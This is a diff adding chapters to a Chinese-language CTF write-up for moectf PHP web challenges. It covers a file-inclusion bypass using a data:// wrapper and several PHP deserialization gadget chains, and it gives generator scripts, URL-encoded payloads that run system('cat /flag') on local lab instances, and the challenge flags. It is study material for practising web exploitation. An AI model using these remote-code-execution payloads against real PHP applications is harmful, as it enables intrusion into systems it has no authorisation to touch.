@@ -366,6 +366,433 @@ system('printenv');
 
 这显然是 `.htaccess` 的内容。一个 `.htaccess` 文件可以改变对某种扩展名的解释方法，在这里，我们可以在 `.htaccess` 中设置 Apache 将所有 `.txt` 以 PHP 代码的方式解析，随后将 `lingwen.php` 改名为 `lingwen.txt` 上传并访问即可。
 
+## 16 第十六章 昆仑星途
+
+> [!NOTE]
+> 我们总说人一定要学会坚持，但方向也是不容忽略的、至关重要的因素……<br/>
+> **FLAG:** `moectf{32b41b90-b639-55ae-0b1a-0c87c9661bcc}`
+
+注意到 PHP 脚本：
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+include($_GET['file'] . ".php");
+```
+
+这下舒服了，`include` 函数，这不是把 `flag` 直接送上门了嘛！再仔细一看，`.php`？原来是它会给用户请求的 `file` 地址后面强制加上一个 `.php` 后缀名。无语了……
+
+尝试访问 `http://127.0.0.1:9194/?file=index`，美不胜收啊！`index.php` 的内容如洪水一般一直向下扩展……证明 LFI（本地文件包含漏洞）是可能存在的。再看随题目给出的附件 `source.zip` 中的 `php.ini`：
+
+```ini
+[PHP]
+allow_url_fopen = On
+allow_url_include = On
+```
+
+好啊，这下确认了不仅 LFI 是可行的，甚至 RFI（远程文件包含漏洞）也有可能是可行的！这下舒服了，再看一下 `entrypoint.sh`：
+
+```bash
+#!/bin/bash
+echo $FLAG > /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 30).txt
+unset FLAG
+apache2-foreground
+```
+
+这也太恶劣了吧，`flag` 的文件名还是随机的……看来我们要先用 `ls` 找见 `flag` 再说。不过星澜音在这里兜兜转转半天：刚开始想要尝试 LFI，但是苦于不知道 `flag` 文件的文件名，只好作罢；那就只能尝试 RFI 了，构造 PHP 脚本如下：
+
+```php
+<?php
+  system('ls /');
+?>
+```
+
+找了一位可靠的朋友挂到了他的服务器上，访问！
+
+![尝试使用 RFI 攻击](./try_RFI_attack.png)
+
+诶？！或许是语法的问题？随后星澜音尝试了：
+
+```plain
+http://127.0.0.1:9194/?file=http://localhost/index
+http://127.0.0.1:9194/?file=http://localhost/index.php?
+```
+
+发现都可以将 `index.php` 的内容打印出两份来。星澜音当时想，RFI 的失败是不是因为 HTTPS 的问题🤔后来又由朋友提供了好几个 HTTP Only 的方案，结果……全部失败，`index.php` 就那么耀武扬威地彰显出来，气愤😡
+
+尝试了套一层 Base64 加密的伪协议，不过还是不太行；甚至还想到了日志攻击之类更加复杂和逆天的方法，不过都没有成功。那很诡异了——最后一位大神突然给星澜音托梦
+
+```plain
+http://127.0.0.1:9194/?file=data:text/plain,<?php%20phpinfo();?>
+```
+
+![使用 `data` 封装内容](./pack_using_data.png)
+
+<div align="center">
+
+**？？？？？？？？？？？？？？？？？？？？？？？？？？？？**
+
+</div>
+
+没事了。`data://` 协议是 PHP 的一个 I/O 流包装器，它的用途是将一个经过编码的字符串当一个文件来处理！PHP 将整个 `data:text/plain,...` 视为一个完整的文件路径处理，后面的 `.php` 自然不会与之拼接——事实上，如果你划到这个页面的最下面，一个 `.php` 就孤零零躺在那里。
+
+考虑了那么久的方向结果是错误的，哎……
+
+不过题目做出来就好。构造
+
+```plain
+http://127.0.0.1:9194/?file=data:text/plain,<?php system('ls /'); ?>
+```
+
+得到
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+include($_GET['file'] . ".php"); bin boot dev entrypoint.sh etc flag-VJhlPvt82dhb5oON7SnJNoILgcl9EG.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var .php
+```
+
+`flag` 位于 `flag-VJhlPvt82dhb5oON7SnJNoILgcl9EG.txt` 中。再构造
+
+```plain
+http://127.0.0.1:9194/?file=data:text/plain,<?php system('cat /flag-VJhlPvt82dhb5oON7SnJNoILgcl9EG.txt'); ?>
+```
+
+结束。哎……星澜音写到这里的时候，刚好是 8 月 28 日，军训开训没几天的日子。星澜音来到西电之后，可能是因为水土不服，胃肠功能紊乱，整个人直接寄完了，天天腹泻犯恶心；今天早上突然上吐下泻，没有办法，只好中午打包电脑和行李回家休养几天。下午被这个题坑了快三四个小时，才发现自己的方向一直是错的，幸好调整了方向，不然在 RFI 这个怪圈里就绕不出来了。星澜音的人生，方向又在哪里呢？或许还要等星澜音再探索探索吧。
+
+虽说人生暂时没有方向，但好在星澜音还有一位「心之所向」。❤️好开心w 明天就是七夕节了，星澜音一定要和自己的心之所向永远在一起 (●'◡'●)
+
+## 17 第十七章 星骸迷阵·神念重构
+
+> [!NOTE]
+> **FLAG:** `moectf{cada2f38-3a55-eddd-f38d-e8b0b0ef7be4}`
+
+不太困难的 PHP 反序列题目。由题目给出的 PHP 脚本：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class A {
+    public $a;
+    function __destruct() {
+        eval($this->a);
+    }
+}
+
+if(isset($_GET['a'])) {
+    unserialize($_GET['a']);
+```
+
+这里，`unserialize()` 函数接收一段字符串，并尝试将它还原为一个 PHP 对象或变量。`A` 类中有一个名为 `__destruct()` 的魔术方法，它会在对象被销毁时自动被调用。`eval($this->a)` 会将其中的字符串当作 PHP 代码执行。
+
+我们构造 Payload，控制 `A` 类中 `$a` 属性的值。在本地配置的如 XAMPP 等环境中，我们构建如下脚本以生成 Payload：
+
+```php
+<?php
+class A {
+    public $a;
+}
+
+$exploit = new A();
+$exploit->a = "system('cat /flag');"; 
+$payload = serialize($exploit);
+
+echo urlencode($payload);
+?>
+```
+
+直接猜出 `flag` 位于 `/` 下是很困难的，事实上我们可以通过 `ls` 多次尝试。~~这次终于没放到环境变量里了~~ 随后访问该 PHP 页面，可以得到一串序列化后的 Payload：
+
+```plain
+O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D
+```
+
+附加到 `127.0.0.1:14436/?a=` 后访问即可得到 `flag`。
+
+![由反序列化得到 `flag`](./get_flag_using_unserialization.png)
+
+## 18 第十八章 万卷诡阁·功法连环
+
+> [!NOTE]
+> **FLAG:** `moectf{981340d2-eed8-8181-8cc3-78e67c4d7bf7}`
+
+继续观察脚本：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class PersonA {
+    private $name;
+    function __wakeup() {
+        $name=$this->name;
+        $name->work();
+    }
+}
+
+class PersonB {
+    public $name;
+    function work(){
+        $name=$this->name;
+        eval($name);
+    }
+
+}
+
+if(isset($_GET['person'])) {
+    unserialize($_GET['person']);
+}
+```
+
+类 `PersonA` 中有一个私有属性 `name`，其 `__wakeup()` 魔术方法会获取 `name` 并赋值给变量 `$name`，随后将 `$name` 作为一个对象，调用其 `work()` 方法。类 `PersonB` 中有一个公开属性 `name`，其 `work()` 魔术方法会获取 `name`，赋值后运行它。与 17 题类似的，我们仍然需要将序列化后的 PHP 脚本作为 payload。
+
+根据上面的关系，我们明确这样的攻击链：
+
+1. 使用 `system` 指令作为一个 `PersonB` 对象的 `name`：这样，我们只需要调用该 `PersonB` 对象的 `work()` 方法，即可触发 `system` 指令；
+2. 使用上述整个 `PersonB` 对象作为一个 `PersonA` 对象的 `name`：这样，`PersonA` 对象的 `name` 会被作为一个对象，使其 `work()` 方法得以调用。
+3. 将上述 `PersonA` 对象序列化后作为 `person` 参数的值传入。
+
+故构造 PHP 脚本如下所示：
+
+```php
+<?php
+class PersonA {
+    public $name;
+}
+class PersonB {
+    public $name;
+}
+
+$inner_object = new PersonB();
+$inner_object->name = "system('cat /flag');";
+
+$outer_object = new PersonA();
+$outer_object->name = $inner_object;
+
+$payload = serialize($outer_object);
+
+echo urlencode($payload);
+?>
+```
+
+> [!TIP]
+>
+> 这里有一个需要注意的点：我们需要将 `PersonA` 的属性 `name` 改为 `public`，否则 `outer_object` 的 `name` 无法被赋值。当然，这与源代码是相违背的，但 PHP 的反序列化工具会自动处理这一点。
+
+得到序列化后的 `payload`：
+
+```plain
+O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonB%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D
+```
+
+访问以得到 `flag`。这与 17 题的逻辑大体吻合，这里就不放截图了。
+
+## 19 第十九章 星穹真相·补天归源
+
+> [!NOTE]
+> **FLAG:** `moectf{5ae3db23-2b8c-523a-4e50-ff6f008ba1d9}`
+
+继续观察脚本，我们……啊？这玩意咋这么长？！
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class Person
+{
+    public $name;
+    public $id;
+    public $age;
+
+    public function __invoke($id)
+    {
+        $name = $this->id;
+        $name->name = $id;
+        $name->age = $this->name;
+    }
+}
+
+class PersonA extends Person
+{
+    public function __destruct()
+    {
+        $name = $this->name;
+        $id = $this->id;
+        $age = $this->age;
+        $name->$id($age);
+    }
+}
+
+class PersonB extends Person
+{
+    public function __set($key, $value)
+    {
+        $this->name = $value;
+    }
+}
+
+class PersonC extends Person
+{
+    public function __Check($age)
+    {
+        if(str_contains($this->age . $this->name,"flag"))
+        {
+            die("Hacker!");
+        }
+        $name = $this->name;
+        $name($age);
+    }
+
+    public function __wakeup()
+    {
+        $age = $this->age;
+        $name = $this->id;
+        $name->age = $age;
+        $name($this);
+    }
+}
+
+if(isset($_GET['person']))
+{
+    $person = unserialize($_GET['person']);
+}
+```
+
+看得人头晕……不妨先选几个重要的地方细细看看。
+
+注意到 `die("Hacker!");` 这一行，它的 `if` 逻辑校验了该 `PersonC` 对象的 `age` 和 `name` 的拼接后字符串中是否含有 `flag` 字符。我们断言 `flag` 一定位于此，我们要做的就是想办法通过对 `flag` 字符串的检验。倘若该校验确通过了，那么 `name` 会被作为变量 `$name`，并 **直接当作函数名** 地以参数 `age` 执行。
+
+根据逻辑关系，我们断言，突破口一定位于 `__Check` 函数中，考虑到其中有一条命令 `$name($age);`。我们在 18 题中考究过这一点，这很自然让我们联想到 `system('cat /flag')` 之类的指令，那么，我们的目标就是将该 `PersonC` 实例的 `name` 设置为 `system`，而将传入 `__Check` 函数的 `$age` 设置为 `'cat /flag'`。
+
+那么问题来了，如何唤起 `__Check` 函数呢？目光转向 `PersonA` 类，它的 `__destruct()` 魔术方法会在 `PersonA` 对象即将被显式销毁时执行。考究到 `$name->$id($age);` 面色惊人，我们定然会想到，将 `$name` 赋值为那个 `PersonC` 对象，以执行其 `__Check` 函数，条件是将 `'cat /flag'` 作为 `$age`。
+
+于是我们明晰了我们的攻击链：
+
+1. 构造 `PersonC` 对象，将其 `name` 设置为 `system`，其余值缺省；
+2. 构造 `PersonA` 对象，将其 `name` 设置为上述 `PersonC` 对象，`age` 设置为 `'cat /flag'`。
+3. 将上述 `PersonA` 对象序列化后作为 `person` 的值传入。
+
+故构造 PHP 脚本如下所示：
+
+```php
+<?php
+class Person
+{
+    public $name;
+    public $id;
+    public $age;
+}
+
+class PersonA extends Person {}
+class PersonB extends Person {} 
+class PersonC extends Person {}
+
+$inner_object = new PersonC();
+$inner_object->name = "system";
+
+$outer_object = new PersonA();
+$outer_object->name = $inner_object;
+$outer_object->id = "__Check";
+$outer_object->age = "cat /flag";
+
+$payload = serialize($outer_object);
+
+echo urlencode($payload);
+?>
+```
+
+序列化和访问步骤均略去。虽说页面后面有一个
+
+```plain
+Fatal error: Uncaught Error: Attempt to assign property "age" on null in /app/index.php:53 Stack trace: #0 [internal function]: PersonC->__wakeup() #1 /app/index.php(60): unserialize('O:7:"PersonA":3...') #2 {main} thrown in /app/index.php on line 53
+```
+
+但是 0 个人在意了，我们已经拿到 `flag` 了！耶耶耶——
+
+## 19 第十九章_revenge
+
+> 空间裂缝闭合的刹那，三人坠入一片混沌星穹。这里没有天地之分，只有无数破碎的镜面悬浮流转，每一面镜子都映照出不同的时空片段——有玄天剑宗的庆功宴，有葬星古墟的惨战，甚至还有 HDdss 幼时在赵家偏院练剑的青涩模样。
+>
+> 「昆仑墟终极试炼——万象镜域。」黑猫的声音从四面八方传来，它的身影在万千镜面中同时浮现，「这里的每一面镜子，都记录着你们生命中的真实与谎言。」
+>
+> 最大的镜面突然亮起，浮现出四重相生相克的功法烙印——
+
+重新观察 PHP 文件：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class Person
+{
+    public $name;
+    public $id;
+    public $age;
+}
+
+class PersonA extends Person
+{
+    public function __destruct()
+    {
+        $name = $this->name;
+        $id = $this->id;
+        $name->$id($this->age);
+    }
+}
+
+class PersonB extends Person
+{
+    public function __set($key, $value)
+    {
+        $this->name = $value;
+    }
+
+    public function __invoke($id)
+    {
+        $name = $this->id;
+        $name->name = $id;
+        $name->age = $this->name;
+    }
+}
+
+class PersonC extends Person
+{
+    public function check($age)
+    {
+        $name=$this->name;
+        if($age == null)
+        {
+            die("Age can't be empty.");
+        }
+        else if($name === "system")
+        {
+            die("Hacker!");
+        }
+        else
+        {
+            var_dump($name($age));
+        }
+    }
+
+    public function __wakeup()
+    {
+        $name = $this->id;
+        $name->age = $this->age;
+        $name($this);
+    }
+}
+
+if(isset($_GET['person']))
+{
+    $person = unserialize($_GET['person']);
+}
+```
+
 ## Moe 笑传之猜猜爆
 
 > [!NOTE]
